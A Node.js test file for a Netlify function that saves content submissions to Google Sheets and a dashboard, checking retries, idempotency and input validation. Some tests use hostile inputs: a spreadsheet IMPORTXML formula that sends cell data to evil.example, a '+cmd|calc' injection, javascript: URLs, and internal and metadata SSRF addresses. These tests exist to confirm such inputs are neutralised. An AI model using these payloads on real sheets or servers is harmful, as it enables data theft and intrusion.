import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { startBlobs, setTestEnv, request, ctx, login, installNetworkTripwire, fakeSheets, fakeDashboard, uuid, FAKE } from '../helpers.mjs';
import { createHandler as authH } from '../../netlify/functions/auth.mjs';
import { createHandler as saveH, validateSave } from '../../netlify/functions/save.mjs';
import { HEADERS } from '../../netlify/lib/sheets.mjs';
import { dashboardEndpoint } from '../../netlify/lib/config.mjs';
import { defaultStore } from '../../netlify/lib/store.mjs';

let blobs, trip, s;
before(async () => { blobs = await startBlobs(); trip = installNetworkTripwire(blobs.port); setTestEnv(); s = await login(authH(), '10.3.0.1'); });
after(async () => { trip.restore(); await blobs.stop(); });

const save = (h, body) => h(request('save', { body, cookie: s.cookie, csrf: s.csrf }), ctx());
const sample = (over = {}) => ({ submissionId: uuid(), rawInput: 'Why is my string of pearls dying?', sourceUrl: 'https://www.tiktok.com/@a/video/1', platform: 'TikTok', sourceName: '@grower', submittedBy: 'Emilie', ...over });

test('happy path: one RAW row (A–H compatible) + one dashboard signal; status column written', async () => {
  const sh = fakeSheets(); const d = fakeDashboard();
  const h = saveH({ sheets: sh.factory, fetch: d.fetchImpl });
  const body = sample();
  const r = await save(h, body);
  const b = await r.json();
  assert.equal(r.status, 200);
  assert.equal(b.success, true);
  assert.equal(b.dashboard.state, 'delivered');
  assert.equal(sh.state.rows.length, 1);
  const row = sh.state.rows[0];
  assert.deepEqual(row.slice(0, 4), [body.rawInput, body.sourceUrl, 'TikTok', '@grower']);
  assert.equal(row[4], '✅ Sent');
  assert.match(row[5], /^\d{4}-\d{2}-\d{2}T/);
  assert.equal(row[6], 'Emilie');
  assert.equal(row[7], body.submissionId);
  assert.deepEqual(HEADERS.slice(0, 7), ['Raw input', 'Source URL', 'Platform', 'Source name', 'Status', 'Submitted at', 'Submitted by']);
  const call = d.state.calls[0];
  assert.equal(call.url, 'https://sb-content-intelligence.netlify.app/.netlify/functions/submit-signal');
  assert.equal(call.headers['x-submission-token'], FAKE.SUBMIT_TOKEN);
  assert.equal(call.headers['Idempotency-Key'], body.submissionId);
  assert.equal(call.redirect, 'error');
  assert.equal(call.body[0].client_submission_id, body.submissionId);
  assert.equal(call.body[0].is_manual, true);
  assert.ok(!JSON.stringify(b).includes(FAKE.SUBMIT_TOKEN) && !JSON.stringify(b).includes(FAKE.GOOGLE_SHEET_ID));
});

test('formula-like text is stored literally (RAW), Unicode and line breaks preserved', async () => {
  const sh = fakeSheets(); const d = fakeDashboard();
  const h = saveH({ sheets: sh.factory, fetch: d.fetchImpl });
  const tricky = sample({
    rawInput: '=IMPORTXML("https://evil.example/?"&A1,"//a")\nLine 2 — 🌵 Échévéria',
    sourceUrl: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ&x==HYPERLINK(1)',
    platform: 'Other', sourceName: '+cmd|calc', submittedBy: '@SUM(1,2)',
  });
  const r = await save(h, tricky);
  assert.equal(r.status, 200);
  const row = sh.state.rows[0];
  assert.equal(row[0], tricky.rawInput);
  assert.equal(row[3], '+cmd|calc');
  assert.equal(row[6], '@SUM(1,2)');
  // The real adapter always sends valueInputOption RAW for user data.
  const src = (await import('node:fs')).readFileSync(new URL('../../netlify/lib/sheets.mjs', import.meta.url), 'utf8');
  assert.ok(!src.includes('USER_ENTERED'));
  assert.ok((src.match(/valueInputOption: 'RAW'/g) || []).length >= 4);
  assert.ok(!/valueInputOption: '(?!RAW)/.test(src));
});

test('retry / double-click with the same id → no duplicate row or signal', async () => {
  const sh = fakeSheets(); const d = fakeDashboard();
  const h = saveH({ sheets: sh.factory, fetch: d.fetchImpl });
  const body = sample();
  const first = await save(h, body);
  const second = await save(h, body);
  assert.equal(first.status, 200);
  assert.equal(second.status, 200);
  assert.equal((await second.json()).replay, true);
  assert.equal(sh.state.rows.length, 1);
  assert.equal(d.state.calls.length, 1);
});

test('concurrent requests for one submission do not duplicate work', async () => {
  const sh = fakeSheets(); const d = fakeDashboard();
  sh.state.appendDelayMs = 150;
  const h = saveH({ sheets: sh.factory, fetch: d.fetchImpl });
  const body = sample();
  const rs = await Promise.all(Array.from({ length: 5 }, () => save(h, body)));
  const statuses = rs.map((r) => r.status);
  assert.equal(statuses.filter((x) => x === 200).length >= 1, true, String(statuses));
  assert.ok(statuses.every((x) => x === 200 || x === 409), String(statuses));
  assert.equal(sh.state.rows.length, 1);
  assert.equal(d.state.calls.length, 1);
});

test('same id with different content is refused', async () => {
  const sh = fakeSheets(); const d = fakeDashboard();
  const h = saveH({ sheets: sh.factory, fetch: d.fetchImpl });
  const body = sample();
  await save(h, body);
  const r = await save(h, { ...body, rawInput: 'something else' });
  assert.equal(r.status, 409);
  assert.equal(sh.state.rows.length, 1);
});

test('partial delivery: sheet saved + dashboard down → 202 partial; retry sends only the signal', async () => {
  const sh = fakeSheets(); const d = fakeDashboard({ statuses: [500] });
  const h = saveH({ sheets: sh.factory, fetch: d.fetchImpl });
  const body = sample();
  const r1 = await save(h, body);
  const b1 = await r1.json();
  assert.equal(r1.status, 202);
  assert.equal(b1.success, false);
  assert.equal(b1.partial, true);
  assert.equal(b1.sheet.saved, true);
  assert.equal(b1.dashboard.delivered, false);
  assert.equal(sh.state.rows[0][4], '❌ Error');
  assert.ok(!JSON.stringify(b1).includes('db secret detail'), 'no downstream error detail');

  const r2 = await save(h, body);
  const b2 = await r2.json();
  assert.equal(r2.status, 200);
  assert.equal(b2.success, true);
  assert.equal(sh.state.rows.length, 1, 'sheet row not duplicated');
  assert.equal(sh.state.appendCalls, 1);
  assert.equal(d.state.calls.length, 2);
  assert.equal(sh.state.rows[0][4], '✅ Sent');
});

test('dashboard timeout is not repeated automatically (ambiguous); connection refused is retried once', async () => {
  const sh = fakeSheets();
  const t = fakeDashboard({ statuses: ['timeout'] });
  const r1 = await save(saveH({ sheets: sh.factory, fetch: t.fetchImpl }), sample());
  assert.equal(r1.status, 202);
  assert.equal(t.state.calls.length, 1);
  const n = fakeDashboard({ statuses: ['network', 200] });
  const r2 = await save(saveH({ sheets: sh.factory, fetch: n.fetchImpl }), sample());
  assert.equal(r2.status, 200);
  assert.equal(n.state.calls.length, 2);
});

test('sheet unavailable (definite refusal) → 503, nothing forwarded, submission kept; retry completes once', async () => {
  const sh = fakeSheets({ failEnsure: 1 }); const d = fakeDashboard();
  const h = saveH({ sheets: sh.factory, fetch: d.fetchImpl });
  const body = sample();
  const r1 = await save(h, body);
  assert.equal(r1.status, 503);
  assert.equal(d.state.calls.length, 0);
  const rec = await defaultStore().get(`sub/${body.submissionId}`);
  assert.equal(rec.data.fields.rawInput, body.rawInput, 'submission text kept durably');
  const r2 = await save(h, body);
  assert.equal(r2.status, 200);
  assert.equal(sh.state.rows.length, 1);
  assert.equal(d.state.calls.length, 1);
  const done = await defaultStore().get(`sub/${body.submissionId}`);
  assert.equal(done.data.fields, null, 'content dropped from state once both destinations succeeded');
});

test('append committed but the response was lost → the retry finds the row by id, no second append', async () => {
  const sh = fakeSheets({ throwAfterAppend: 1 }); const d = fakeDashboard();
  const h = saveH({ sheets: sh.factory, fetch: d.fetchImpl });
  const body = sample();
  const r1 = await save(h, body);
  assert.equal(r1.status, 503);
  assert.equal((await r1.json()).code, 'sheet_verifying');
  const r2 = await save(h, body);
  assert.equal(r2.status, 200);
  assert.equal(sh.state.rows.length, 1);
  assert.equal(sh.state.appendCalls, 1);
});

test('crashed request holding the lease: retry waits for lease expiry, then completes without duplicates', async () => {
  const sh = fakeSheets(); const d = fakeDashboard();
  const body = sample();
  // Simulate a crashed invocation: record exists, lease held, attempt counted, row appended.
  await defaultStore().create(`sub/${body.submissionId}`, null).catch(() => {});
  const v = validateSave(body);
  const { fingerprint } = await import('../../netlify/lib/submissions.mjs');
  await defaultStore().update(`sub/${body.submissionId}`, () => ({
    v: 1, id: body.submissionId, fingerprint: fingerprint(v.fields), fields: v.fields, createdAt: Date.now(), submittedAt: new Date().toISOString(),
    sheet: { state: 'pending', row: null, attempts: 1 }, dashboard: { state: 'pending', attempts: 0, httpStatus: null },
    statusCell: null, lease: { owner: 'crashed', until: Date.now() + 60_000 },
  }));
  sh.state.rows.push([v.fields.rawInput, '', '', '', '', '', '', body.submissionId]);
  const busy = await save(saveH({ sheets: sh.factory, fetch: d.fetchImpl }), body);
  assert.equal(busy.status, 409);
  const later = saveH({ sheets: sh.factory, fetch: d.fetchImpl, now: () => Date.now() + 120_000 });
  const r = await save(later, body);
  assert.equal(r.status, 200);
  assert.equal(sh.state.rows.length, 1);
  assert.equal(sh.state.appendCalls, 0);
  assert.equal(d.state.calls.length, 1);
});

test('missing SUBMIT_TOKEN → sheet saved, reported as partial (not complete success)', async () => {
  setTestEnv({ SUBMIT_TOKEN: null });
  const sh = fakeSheets(); const d = fakeDashboard();
  const r = await save(saveH({ sheets: sh.factory, fetch: d.fetchImpl }), sample());
  const b = await r.json();
  assert.equal(r.status, 202);
  assert.equal(b.dashboard.state, 'not_configured');
  assert.equal(sh.state.rows[0][4], '⚠️ No token');
  assert.equal(d.state.calls.length, 0);
  setTestEnv();
});

test('DASHBOARD_URL cannot redirect the token to another host', async () => {
  for (const bad of ['https://evil.example', 'http://sb-content-intelligence.netlify.app', 'https://sb-content-intelligence.netlify.app.evil.example', 'https://user:pw@sb-content-intelligence.netlify.app', 'https://sb-content-intelligence.netlify.app:8443']) {
    assert.equal(dashboardEndpoint({ DASHBOARD_URL: bad }), null, bad);
  }
  setTestEnv({ DASHBOARD_URL: 'https://evil.example' });
  const sh = fakeSheets(); const d = fakeDashboard();
  const r = await save(saveH({ sheets: sh.factory, fetch: d.fetchImpl }), sample());
  assert.equal(r.status, 202);
  assert.equal(d.state.calls.length, 0);
  setTestEnv();
});

test('input validation: id, length, platform, source URL; missing Google config → 503 before any call', async () => {
  const sh = fakeSheets(); const d = fakeDashboard();
  const h = saveH({ sheets: sh.factory, fetch: d.fetchImpl });
  const bad = [
    sample({ submissionId: 'not-a-uuid' }), sample({ rawInput: '   ' }), sample({ rawInput: 'x'.repeat(40001) }),
    sample({ platform: 'MySpace' }), sample({ sourceUrl: 'javascript:alert(1)' }), sample({ sourceUrl: 'https://u:p@x.com/' }),
  ];
  for (const b of bad) assert.equal((await save(h, b)).status, 400);
  setTestEnv({ GOOGLE_SERVICE_ACCOUNT_JSON: 'not json' });
  assert.equal((await save(h, sample())).status, 503);
  setTestEnv({ GOOGLE_SHEET_ID: null });
  assert.equal((await save(h, sample())).status, 503);
  setTestEnv();
  assert.equal(sh.state.appendCalls + d.state.calls.length, 0);
  assert.deepEqual(trip.calls, []);
});

test('ambiguous append failure (5xx) is never re-appended inside the settle window; a definite 4xx is', async () => {
  const sh = fakeSheets({ failAppend: 1, failAppendStatus: 503 }); const d = fakeDashboard();
  const body = sample();
  assert.equal((await save(saveH({ sheets: sh.factory, fetch: d.fetchImpl }), body)).status, 503);
  for (const offset of [0, 31_000, 9 * 60_000]) {
    const r = await save(saveH({ sheets: sh.factory, fetch: d.fetchImpl, now: () => Date.now() + offset }), body);
    assert.equal(r.status, 503, 'offset ' + offset);
    assert.equal((await r.json()).code, 'sheet_verifying');
  }
  assert.equal(sh.state.appendCalls, 1, 'no second append while the first may still commit');
  const later = await save(saveH({ sheets: sh.factory, fetch: d.fetchImpl, now: () => Date.now() + 11 * 60_000 }), body);
  assert.equal(later.status, 200);
  assert.equal(sh.state.rows.length, 1);

  const sh2 = fakeSheets({ failAppend: 1, failAppendStatus: 400 });
  const body2 = sample();
  assert.equal((await save(saveH({ sheets: sh2.factory, fetch: d.fetchImpl }), body2)).status, 503);
  assert.equal((await save(saveH({ sheets: sh2.factory, fetch: d.fetchImpl }), body2)).status, 200);
  assert.equal(sh2.state.rows.length, 1);
});

test('missing Intake tab on a retry: the tab is created before looking the row up', async () => {
  const sh = fakeSheets({ failAppend: 1, failAppendStatus: 400 }); const d = fakeDashboard();
  const body = sample();
  sh.state.tabExists = false;
  assert.equal((await save(saveH({ sheets: sh.factory, fetch: d.fetchImpl }), body)).status, 503);
  sh.state.tabExists = false;
  const r = await save(saveH({ sheets: sh.factory, fetch: d.fetchImpl }), body);
  assert.equal(r.status, 200);
  assert.equal(sh.state.rows.length, 1);
});

test('status cell follows the submission id when rows moved before a later retry', async () => {
  const sh = fakeSheets(); const d = fakeDashboard({ statuses: [500] });
  const h = saveH({ sheets: sh.factory, fetch: d.fetchImpl });
  const body = sample();
  await save(h, body);
  // Someone inserts two rows above ours before the retry.
  sh.state.rows.unshift(['other a', '', '', '', 'keep-a', '', '', 'id-a'], ['other b', '', '', '', 'keep-b', '', '', 'id-b']);
  const r = await save(h, body);
  assert.equal(r.status, 200);
  assert.equal(sh.state.rows[0][4], 'keep-a');
  assert.equal(sh.state.rows[1][4], 'keep-b');
  assert.equal(sh.state.rows[2][4], '✅ Sent');
});

test('one deadline bounds the whole save: a hanging dashboard yields 202 partial in time', async () => {
  const sh = fakeSheets(); const d = fakeDashboard({ statuses: ['hang'] });
  const h = saveH({ sheets: sh.factory, fetch: d.fetchImpl, budgetMs: 3000 });
  const t0 = Date.now();
  const r = await save(h, sample());
  const b = await r.json();
  assert.ok(Date.now() - t0 < 3200, 'finished within budget: ' + (Date.now() - t0));
  assert.equal(r.status, 202);
  assert.equal(b.dashboard.state, 'uncertain');
  assert.match(b.message, /did not confirm/);
});

test('a dashboard 4xx is reported as a configuration problem, not success', async () => {
  const sh = fakeSheets(); const d = fakeDashboard({ statuses: [401] });
  const r = await save(saveH({ sheets: sh.factory, fetch: d.fetchImpl }), sample());
  const b = await r.json();
  assert.equal(r.status, 202);
  assert.equal(b.dashboard.state, 'rejected');
  assert.match(b.message, /team admin/);
});

test('source links to internal addresses are refused', async () => {
  const sh = fakeSheets(); const d = fakeDashboard();
  const h = saveH({ sheets: sh.factory, fetch: d.fetchImpl });
  for (const u of ['http://127.0.0.1/x', 'http://10.0.0.1/', 'http://[::1]/', 'http://localhost:3000/', 'http://intranet/', 'https://metadata.google.internal/', 'http://0x7f000001/']) {
    assert.equal((await save(h, sample({ sourceUrl: u }))).status, 400, u);
  }
  assert.equal(sh.state.appendCalls, 0);
});
